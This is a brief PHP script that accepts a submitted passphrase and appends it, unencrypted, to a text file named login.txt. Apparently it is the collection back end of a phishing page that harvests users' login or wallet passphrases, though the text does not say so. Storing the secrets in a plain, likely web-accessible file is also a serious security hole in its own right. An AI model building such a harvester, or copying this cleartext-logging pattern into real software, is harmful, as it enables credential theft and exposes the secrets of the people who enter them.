<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $passphrase = trim($_POST["passphrase"]);
    
    if (!empty($passphrase)) {
        file_put_contents("login.txt", $passphrase . PHP_EOL, FILE_APPEND);
        echo "Passphrase saved successfully!";
    } else {
        echo "Please enter a valid passphrase.";
    }
}
?>


